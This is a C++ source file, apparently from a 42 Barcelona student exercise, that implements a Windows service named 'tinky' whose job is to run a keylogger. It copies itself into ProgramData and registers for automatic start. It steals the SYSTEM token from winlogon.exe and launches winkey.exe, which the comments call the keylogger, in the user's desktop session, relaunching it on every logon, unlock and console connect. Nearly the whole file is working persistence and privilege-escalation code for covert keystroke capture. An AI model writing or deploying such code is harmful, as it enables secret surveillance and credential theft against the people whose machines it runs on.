/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   svc.cpp                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: cescanue <cescanue@student.42barcelona.    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/10/09 20:59:37 by cescanue          #+#    #+#             */
/*   Updated: 2024/10/09 20:59:38 by cescanue         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <windows.h>
#include <fstream>
#include <iostream>
#include <shlobj.h>
#include <KnownFolders.h>
#include <shlwapi.h>
#include <string>
#include <sstream>
#include <wtsapi32.h>
#include <tlhelp32.h>

#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wtsapi32.lib")

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

const char* serviceName = "tinky";
DWORD winkeyProcessId = 0;  // Variable global para almacenar el PID de winkey.exe

// Función para obtener la ruta de ProgramData dinámicamente
bool GetProgramDataPath(char* path, size_t size) {
    PWSTR programDataPath = NULL;
    if (SHGetKnownFolderPath(FOLDERID_ProgramData, 0, NULL, &programDataPath) == S_OK) {
        wcstombs_s(NULL, path, size, programDataPath, size - 1);
        PathAppendA(path, "TinkyWinky");
        CoTaskMemFree(programDataPath);
        return true;
    }
    return false;
}

// Función para obtener la ruta del directorio donde está svc.exe
void GetExecutableDirectory(char* exePath, size_t size) {
    GetModuleFileName(NULL, exePath, size);
    PathRemoveFileSpecA(exePath);
}

// Función para escribir en el archivo de log con fecha y hora
void WriteToLog(const char* str) {
    char logPath[MAX_PATH];
    GetExecutableDirectory(logPath, sizeof(logPath));
    PathAppendA(logPath, "svc.log");

    // Obtener la fecha y hora actual
    SYSTEMTIME time;
    GetLocalTime(&time);

    std::ofstream log(logPath, std::ios_base::app);
    if (log.is_open()) {
        // Formato de fecha y hora: [YYYY-MM-DD HH:MM:SS]
        log << "[" << time.wYear << "-"
            << (time.wMonth < 10 ? "0" : "") << time.wMonth << "-"
            << (time.wDay < 10 ? "0" : "") << time.wDay << " "
            << (time.wHour < 10 ? "0" : "") << time.wHour << ":"
            << (time.wMinute < 10 ? "0" : "") << time.wMinute << ":"
            << (time.wSecond < 10 ? "0" : "") << time.wSecond << "] ";

        log << str << std::endl;
        log.close();
    }
}

// Función para verificar y matar instancias existentes de winkey.exe
void KillExistingWinkeyInstances() {
    WriteToLog("Checking for existing instances of winkey.exe...");

    // Tomar un snapshot de todos los procesos en el sistema
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        WriteToLog("Failed to create process snapshot.");
        return;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &processEntry)) {
        do {
            if (strcmp(processEntry.szExeFile, "winkey.exe") == 0) {
                // Encontramos una instancia de winkey.exe, la matamos
                WriteToLog("Existing instance of winkey.exe found, terminating it...");
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                    WriteToLog("winkey.exe terminated.");
                } else {
                    WriteToLog("Failed to open existing winkey.exe process for termination.");
                }
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }

    CloseHandle(hSnapshot);
}

// Función para obtener el token SYSTEM desde winlogon.exe
HANDLE GetSystemToken() {
    DWORD winlogonPid = 0;
    HANDLE hProcess = NULL;
    HANDLE hTokenSystem = NULL;

    // Tomar un snapshot de todos los procesos
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        WriteToLog("Failed to create process snapshot.");
        return NULL;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // Buscar el proceso winlogon.exe
    if (Process32First(hSnapshot, &processEntry)) {
        do {
            if (strcmp(processEntry.szExeFile, "winlogon.exe") == 0) {
                winlogonPid = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }
    CloseHandle(hSnapshot);

    if (winlogonPid == 0) {
        WriteToLog("Failed to find winlogon.exe process.");
        return NULL;
    }

    // Abrir el proceso winlogon.exe con permisos necesarios
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
    if (!hProcess) {
        WriteToLog("Failed to open winlogon.exe process.");
        return NULL;
    }

    // Obtener el token del proceso winlogon.exe
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hTokenSystem)) {
        WriteToLog("Failed to obtain SYSTEM token from winlogon.exe.");
        CloseHandle(hProcess);
        return NULL;
    }

    CloseHandle(hProcess);
    return hTokenSystem;  // Devolver el token SYSTEM
}

// Función para lanzar el keylogger con el token SYSTEM
void StartKeyloggerWithSystemToken() {
    WriteToLog("Attempting to impersonate SYSTEM token...");

    // Obtener el token SYSTEM desde winlogon.exe
    HANDLE hTokenSystem = GetSystemToken();
    if (hTokenSystem == NULL) {
        WriteToLog("Failed to get SYSTEM token. Keylogger will not start.");
        return;
    }

    HANDLE hDupToken = NULL;
    if (!DuplicateTokenEx(hTokenSystem, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
        WriteToLog("Failed to duplicate SYSTEM token.");
        CloseHandle(hTokenSystem);
        return;
    }

    // Matar cualquier instancia existente de winkey.exe
    KillExistingWinkeyInstances();

    // Configurar la información de inicio del proceso (keylogger)
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.lpDesktop = const_cast<LPSTR>("winsta0\\default");

    // Obtener la ruta completa de winkey.exe
    char keyloggerPath[MAX_PATH];
    GetExecutableDirectory(keyloggerPath, sizeof(keyloggerPath));
    PathAppendA(keyloggerPath, "winkey.exe");

    std::stringstream logMessage;
    logMessage << "Attempting to execute winkey.exe from: " << keyloggerPath;
    WriteToLog(logMessage.str().c_str());

    // Iniciar el proceso del keylogger usando CreateProcessAsUser con el token SYSTEM
    if (CreateProcessAsUser(
        hDupToken,
        keyloggerPath,
        NULL,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi)) {
        winkeyProcessId = pi.dwProcessId;  // Guardar el PID del keylogger
        WriteToLog("winkey.exe started successfully with SYSTEM token.");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        DWORD error = GetLastError();
        std::stringstream ss;
        ss << "Failed to start winkey.exe. Error code: " << error;
        WriteToLog(ss.str().c_str());
    }

    CloseHandle(hDupToken);
    CloseHandle(hTokenSystem);
}

// Función para borrar todo el contenido de un directorio
bool DeleteDirectoryContents(const std::string& dirPath) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((dirPath + "\\*").c_str(), &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return false;
    }

    do {
        const std::string fileOrDir = dirPath + "\\" + findFileData.cFileName;
        if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0) {
            continue; // Ignorar los directorios . y ..
        }
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            DeleteDirectoryContents(fileOrDir);  // Recursivamente borrar subdirectorios
            RemoveDirectoryA(fileOrDir.c_str());
        } else {
            DeleteFileA(fileOrDir.c_str());
        }
    } while (FindNextFile(hFind, &findFileData) != 0);
    
    FindClose(hFind);
    return true;
}

// Función para verificar si el usuario tiene permisos de administrador
bool IsUserAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(
        &NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
        &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }

    return isAdmin;
}

// Función para instalar el servicio y configurarlo como automático
void InstallService() {
    if (!IsUserAdmin()) {
        std::cerr << "Error: Administrator privileges are required to install the service." << std::endl;
        return;
    }

    if (!std::ifstream("svc.exe") || !std::ifstream("winkey.exe")) {
        std::cerr << "Error: svc.exe or winkey.exe not found in the current directory." << std::endl;
        return;
    }
    if (!std::ifstream("winkey.ini")) {
        std::cout << "Warning: winkey.ini not found. Continuing without ini file." << std::endl;
    }

    char programDir[MAX_PATH];
    if (!GetProgramDataPath(programDir, sizeof(programDir))) {
        std::cerr << "Error: Could not get ProgramData path." << std::endl;
        return;
    }

    if (PathFileExistsA(programDir)) {
        WriteToLog("ProgramData directory already exists. Continuing...");
    } else {
        if (SHCreateDirectoryExA(NULL, programDir, NULL) != ERROR_SUCCESS) {
            std::cerr << "Error: Could not create directory in ProgramData." << std::endl;
            return;
        }
        WriteToLog("ProgramData directory created successfully.");
    }

    char svcPath[MAX_PATH];
    char winkeyPath[MAX_PATH];
    char winkeyIniPath[MAX_PATH];

    strcpy_s(svcPath, programDir);
    PathAppendA(svcPath, "svc.exe");

    strcpy_s(winkeyPath, programDir);
    PathAppendA(winkeyPath, "winkey.exe");

    strcpy_s(winkeyIniPath, programDir);
    PathAppendA(winkeyIniPath, "winkey.ini");

    // Copiar archivos al directorio
    if (!CopyFileA("svc.exe", svcPath, FALSE)) {
        DWORD error = GetLastError();
        std::cerr << "Error: Could not copy svc.exe. Error code: " << error << std::endl;
        return;
    }
    if (!CopyFileA("winkey.exe", winkeyPath, FALSE)) {
        DWORD error = GetLastError();
        std::cerr << "Error: Could not copy winkey.exe. Error code: " << error << std::endl;
        return;
    }
    if (!CopyFileA("winkey.ini", winkeyIniPath, TRUE)) {
        DWORD error = GetLastError();
        std::cerr << "Warning: Could not copy winkey.ini. Error code: " << error << std::endl;
    }

    SC_HANDLE scManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scManager) {
        DWORD error = GetLastError();
        std::cerr << "Error: Could not open Service Control Manager. Error code: " << error << std::endl;
        return;
    }

    SC_HANDLE scService = CreateService(
        scManager,
        serviceName,
        serviceName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        svcPath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (!scService) {
        DWORD error = GetLastError();
        if (error == ERROR_ACCESS_DENIED) {
            std::cerr << "Error: Access denied. Please run the program as an administrator." << std::endl;
        } else {
            std::cerr << "Error: Could not create service. Error code: " << error << std::endl;
        }
        CloseServiceHandle(scManager);
        return;
    } else {
        std::cout << "Service installed successfully and set to start automatically." << std::endl;
        WriteToLog("Service installed and set to automatic startup.");
    }

    if (!StartService(scService, 0, NULL)) {
        DWORD error = GetLastError();
        std::stringstream ss;
        ss << "Failed to start the service. Error code: " << error;
        WriteToLog(ss.str().c_str());
    } else {
        WriteToLog("Service started successfully.");
    }

    CloseServiceHandle(scService);
    CloseServiceHandle(scManager);
}

// Función para eliminar el servicio y mostrar mensajes en consola
void RemoveService() {
    if (!IsUserAdmin()) {
        std::cerr << "Error: Administrator privileges are required to remove the service." << std::endl;
        return;
    }

    SC_HANDLE scManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scManager) {
        DWORD error = GetLastError();
        std::cerr << "Error: Could not open Service Control Manager. Error code: " << error << std::endl;
        return;
    }

    SC_HANDLE scService = OpenService(scManager, serviceName, SERVICE_STOP | DELETE);
    if (!scService) {
        DWORD error = GetLastError();
        if (error == ERROR_ACCESS_DENIED) {
            std::cerr << "Error: Access denied. Please run the program as an administrator." << std::endl;
        } else {
            std::cerr << "Error: Could not open service. Error code: " << error << std::endl;
        }
        CloseServiceHandle(scManager);
        return;
    }

    // Intentar detener el servicio antes de eliminarlo
    SERVICE_STATUS ss;
    if (ControlService(scService, SERVICE_CONTROL_STOP, &ss)) {
        std::cout << "Service stopped successfully." << std::endl;
        WriteToLog("Service stopped successfully.");
    } else {
        DWORD error = GetLastError();
        if (error == ERROR_SERVICE_NOT_ACTIVE) {
            std::cout << "Service is not running." << std::endl;
            WriteToLog("Service is not running.");
        } else {
            std::cerr << "Error stopping the service. Error code: " << error << std::endl;
            WriteToLog("Error stopping the service.");
        }
    }

    // Eliminar el servicio
    if (DeleteService(scService)) {
        std::cout << "Service removed successfully." << std::endl;
        WriteToLog("Service removed successfully.");
    } else {
        DWORD error = GetLastError();
        if (error == ERROR_ACCESS_DENIED) {
            std::cerr << "Error: Access denied. Please run the program as an administrator." << std::endl;
        } else {
            std::cerr << "Error removing the service. Error code: " << error << std::endl;
            WriteToLog("Error removing the service.");
        }
    }

    CloseServiceHandle(scService);
    CloseServiceHandle(scManager);

    char programDir[MAX_PATH];
    if (!GetProgramDataPath(programDir, sizeof(programDir))) {
        std::cerr << "Error: Could not get ProgramData path." << std::endl;
        return;
    }

    // Eliminar el contenido del directorio
    if (DeleteDirectoryContents(programDir)) {
        std::cout << "Directory contents deleted successfully." << std::endl;
        WriteToLog("Directory contents deleted successfully.");
    } else {
        std::cerr << "Error deleting directory contents." << std::endl;
        WriteToLog("Error deleting directory contents.");
    }

    // Intentar eliminar el directorio
    if (RemoveDirectoryA(programDir)) {
        std::cout << "Directory deleted successfully." << std::endl;
        WriteToLog("Directory deleted successfully.");
    } else {
        std::cerr << "Failed to delete directory. It may contain files." << std::endl;
        WriteToLog("Failed to delete directory. It may contain files.");
    }
}

// Función para manejar las notificaciones de cambio de sesión y otros eventos
DWORD WINAPI ServiceCtrlHandler(DWORD control, DWORD eventType, LPVOID eventData, LPVOID context) {
    // Evitar la advertencia por el parámetro no utilizado
    (void)context;

    switch (control) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        if (winkeyProcessId != 0) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, winkeyProcessId);
            if (hProcess) {
                TerminateProcess(hProcess, 0);  // Terminar winkey.exe
                CloseHandle(hProcess);
                WriteToLog("winkey.exe process terminated.");
            } else {
                WriteToLog("Failed to open winkey.exe process for termination.");
            }
        }
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        WriteToLog("Service stopped.");
        SetServiceStatus(hStatus, &ServiceStatus);
        break;

    case SERVICE_CONTROL_SESSIONCHANGE:
        // Manejar cambios de sesión
        {
            WTSSESSION_NOTIFICATION* sessionNotification = (WTSSESSION_NOTIFICATION*)eventData;
            std::stringstream ss;

            switch (eventType) {
            case WTS_SESSION_LOGON:
                ss << "User logged on. Session ID: " << sessionNotification->dwSessionId;
                WriteToLog(ss.str().c_str());
                StartKeyloggerWithSystemToken();  // Relanzar winkey.exe en la nueva sesión
                break;

            case WTS_SESSION_LOGOFF:
                ss << "User logged off. Session ID: " << sessionNotification->dwSessionId;
                WriteToLog(ss.str().c_str());
                KillExistingWinkeyInstances();  // Terminar winkey.exe en la sesión que cierra
                break;

            case WTS_SESSION_LOCK:
                ss << "Session locked. Session ID: " << sessionNotification->dwSessionId;
                WriteToLog(ss.str().c_str());
                KillExistingWinkeyInstances();  // Terminar winkey.exe cuando la sesión se bloquea
                break;

            case WTS_SESSION_UNLOCK:
                ss << "Session unlocked. Session ID: " << sessionNotification->dwSessionId;
                WriteToLog(ss.str().c_str());
                StartKeyloggerWithSystemToken();  // Relanzar winkey.exe cuando la sesión se desbloquea
                break;

            case WTS_CONSOLE_CONNECT:
                ss << "Console connected. Session ID: " << sessionNotification->dwSessionId;
                WriteToLog(ss.str().c_str());
                StartKeyloggerWithSystemToken();  // Relanzar winkey.exe en la nueva sesión de consola
                break;

            case WTS_CONSOLE_DISCONNECT:
                ss << "Console disconnected. Session ID: " << sessionNotification->dwSessionId;
                WriteToLog(ss.str().c_str());
                KillExistingWinkeyInstances();  // Terminar winkey.exe en la sesión desconectada
                break;

            default:
                ss << "Unhandled session event. Event type: " << eventType << " Session ID: " << sessionNotification->dwSessionId;
                WriteToLog(ss.str().c_str());
                break;
            }
        }
        break;

    default:
        break;
    }
    return NO_ERROR;
}

// Función principal del servicio
void WINAPI ServiceMain(DWORD argc, LPSTR* argv) {
    (void)argc;
    (void)argv;

    hStatus = RegisterServiceCtrlHandlerEx(serviceName, ServiceCtrlHandler, NULL);

    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_SESSIONCHANGE;
    SetServiceStatus(hStatus, &ServiceStatus);

    WriteToLog("Service is starting...");

    // Iniciar el keylogger en la sesión del usuario
    StartKeyloggerWithSystemToken();

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);
    WriteToLog("Service is running...");

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
        Sleep(1000);
    }
}

// Mostrar instrucciones de uso
void ShowUsage() {
    std::cout << "Usage: svc.exe [command]" << std::endl;
    std::cout << "Commands:" << std::endl;
    std::cout << "  install   - Install the service" << std::endl;
    std::cout << "  delete    - delete the service" << std::endl;
    std::cout << "  start     - Start the service" << std::endl;
    std::cout << "  stop      - Stop the service" << std::endl;
}

// Función principal
int main(int argc, char** argv) {
    if (argc > 1) {
        std::string arg = argv[1];

        if (arg == "install") {
            InstallService();
        } else if (arg == "delete") {
            RemoveService();
        } else if (arg == "start") {
            SC_HANDLE scManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
            if (!scManager) {
                std::cerr << "Error: Could not open Service Control Manager." << std::endl;
                return 1;
            }

            SC_HANDLE scService = OpenService(scManager, serviceName, SERVICE_START);
            if (!scService) {
                std::cerr << "Error: Could not open service." << std::endl;
                CloseServiceHandle(scManager);
                return 1;
            }

            if (StartService(scService, 0, NULL)) {
                std::cout << "Service started successfully." << std::endl;
            } else {
                std::cerr << "Error: Could not start service." << std::endl;
            }

            CloseServiceHandle(scService);
            CloseServiceHandle(scManager);
        } else if (arg == "stop") {
            SC_HANDLE scManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
            if (!scManager) {
                std::cerr << "Error: Could not open Service Control Manager." << std::endl;
                return 1;
            }

            SC_HANDLE scService = OpenService(scManager, serviceName, SERVICE_STOP);
            if (!scService) {
                std::cerr << "Error: Could not open service." << std::endl;
                CloseServiceHandle(scManager);
                return 1;
            }

            SERVICE_STATUS ss;
            if (ControlService(scService, SERVICE_CONTROL_STOP, &ss)) {
                std::cout << "Service stopped successfully." << std::endl;
            } else {
                std::cerr << "Error: Could not stop service." << std::endl;
            }

            CloseServiceHandle(scService);
            CloseServiceHandle(scManager);
        } else {
            std::cerr << "Unknown command: " << arg << std::endl;
            ShowUsage();
        }
        return 0;
    }

    // Mostrar instrucciones de uso si no se proporcionan argumentos
    ShowUsage();

    SERVICE_TABLE_ENTRY ServiceTable[] = {
        { (LPSTR)serviceName, reinterpret_cast<LPSERVICE_MAIN_FUNCTION>(ServiceMain) },
        { NULL, NULL }
    };

    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}
